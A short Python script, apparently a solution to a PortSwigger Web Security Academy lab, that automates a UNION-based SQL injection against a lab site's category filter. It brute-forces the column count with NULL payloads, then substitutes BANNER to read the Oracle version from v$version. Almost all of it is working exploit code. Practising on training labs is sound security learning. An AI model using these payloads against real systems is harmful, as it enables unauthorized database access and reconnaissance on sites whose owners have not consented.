import requests

i = 0
nullPayload = "NULL"
attackUrl = "https://0af4009a046360ea8084fdc200d100ce.web-security-academy.net/filter?category="
header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
}
column = ""
sqli = "' UNION SELECT "

while True:
    payload = sqli + nullPayload + " FROM v$version--"
    nullPayload = nullPayload + ", NULL"
    final_url = attackUrl + payload.replace(" ", "+")
    response = requests.get(url=final_url, headers=header)
    i += 1

    if response.status_code == 200 or i == 2:
        column = final_url
        break

for j in range(1, i + 1): 
    column = column.replace("NULL", "BANNER", 1)
    res1 = requests.get(url=column).text
    if ("Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production" in res1):
        print("You solve the lab")
    column = column.replace("NULL", "BANNER", 2)
    column = column.replace("BANNER", "NULL", 1)
    res2 = requests.get(url=column).text
    if ("Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production" in res2):
        print("You solve the lab")
    
    
